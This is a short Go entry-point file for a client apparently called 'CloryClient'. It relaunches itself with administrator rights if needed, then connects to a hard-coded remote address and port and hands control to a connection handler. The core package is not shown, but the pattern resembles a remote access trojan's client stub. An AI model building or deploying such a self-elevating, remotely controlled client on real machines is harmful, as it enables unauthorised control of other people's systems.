package main

import (
	"CloryClient/core"
	"fmt"
	"os"
	"time"
)

func main(){
	exe, _ := os.Executable()
	fmt.Println(exe)
	if !core.IsAdmin(){
		core.RunMeElevated()
	}
	exe, _ = os.Executable()
	fmt.Println(exe)
	time.Sleep(10*time.Second)

	cc := core.Client{}
	cc.RemoteIP = "192.168.0.13"
	cc.RemotePort ="8080"
	err := cc.ConnectServer()
	core.DisplayMsg(err)
	cc.HandleConnection()
}
